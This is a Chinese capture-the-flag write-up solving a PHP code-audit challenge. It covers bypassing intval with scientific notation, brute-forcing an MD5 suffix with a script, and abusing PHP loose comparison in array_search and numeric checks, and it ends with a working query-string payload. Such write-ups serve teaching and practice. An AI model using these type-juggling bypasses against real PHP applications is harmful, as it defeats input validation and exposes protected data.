# 题目easyphp

[![p90MwPe.md.png](https://s1.ax1x.com/2023/05/08/p90MwPe.md.png)](https://imgse.com/i/p90MwPe)

打开网页，发现是代码审计类问题，代码如下：

```php
 <?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;

$a = $_GET['a'];
$b = $_GET['b'];

if(isset($a) && intval($a) > 6000000 && strlen($a) <= 3){
    if(isset($b) && '8b184b' === substr(md5($b),-6,6)){
        $key1 = 1;
        }else{
            die("Emmm...再想想");
        }
    }else{
    die("Emmm...");
}

$c=(array)json_decode(@$_GET['c']);
if(is_array($c) && !is_numeric(@$c["m"]) && $c["m"] > 2022){
    if(is_array(@$c["n"]) && count($c["n"]) == 2 && is_array($c["n"][0])){
        $d = array_search("DGGJ", $c["n"]);
        $d === false?die("no..."):NULL;
        foreach($c["n"] as $key=>$val){
            $val==="DGGJ"?die("no......"):NULL;
        }
        $key2 = 1;
    }else{
        die("no hack");
    }
}else{
    die("no");
}

if($key1 && $key2){
    include "Hgfks.php";
    echo "You're right"."\n";
    echo $flag;
}

?> 
```

## 代码分析

1. `intval(var)`：将`var`转化为数字（如果需要转化的话），提取其整数部分为返回值；

2. `substr(str, start, length)`：提取子字符串，从`start`索引开始，长度为`length`；

3. `json_decode(json)`：将`json`编码的字符串转化为PHP值，默认转化为`object`，如果设置第二个参数为`true`则转化`array`；

4. `is_numberic(var)`：检查`var`是否为数字或者数字字符串，是返回真，否则返回假；

5. `array_search(val, array)`：在数组中寻找键值`val`，找到则返回键值为`val`的键名；

   `array_search()`采用的是`==`比较，我们可以通过设置`array`的键值为`0`或空数组（`字符串==0`|`==array()`为真）绕过检查；

## 解题过程

+ 通过分析PHP代码，我们的任务是需要构造恰当的`a,b,c`使得`$key1, $key2=1`，这样就会输出flag；

+ `a`的限制是整数部分大于6 000 000，且字符串长度小于3；

  显然这两个条件矛盾，低版本的PHP中`intval`可以解析科学计数法，我们可以采用科学计数法绕过；

+ `b`的限制是`md5`编码后的后6位等于"8b184b"；

+ `c`要求是json编码的数据，

  1. 键名为`m`的键值不能为数字，且大于2022；
  2. 键名为`n`的键值为有2个元素的数组，且它的第一个元素也是数组类型；
  3. 且它的元素中全部都是字符串`"DGGJ"`，使用`===`则要求必须类型是`string`；

  显然条件1的两个方面矛盾，利用PHP弱类型比较中“若数字与字符串比较，则会从头截取字符串，到不为数字字符的内容来与数字比较”；

  显然条件2, 3矛盾，所以我们需要绕过`array_search()`的检查；

1. 构造`a`

   ```
   a=1e9 #1e9=1 000 000 000 >> 6 000 000
   ```

2. 构造`b`

   采用脚本碰撞，找到一个符合要求的值

   ```php
   <?php
       $b = 0;
       while(1)
       {
           if('8b184b' === substr(md5($b), -6, 6))
           {
               echo $b;
               break;
           }
           $b++;
       }
   ?>
   ```

   ```
   b=53724
   ```

3. 构造`c`

   ```php
   <?php
       $c = array("m"=>2023, "n"=>array(array(), 0));
       $c = json_encode($c);
       echo $c;
   ?>
   ```

   ```
   c={"m":"2023c","n":[[],0]}
   ```

+ 综上，一个可行的payload如下：

  ```
  ?a=1e9&b=53724&c={"m":"2023c","n":[[],0]}
  ```

  [![p903ofU.md.png](https://s1.ax1x.com/2023/05/08/p903ofU.md.png)](https://imgse.com/i/p903ofU)

  成功得到flag。

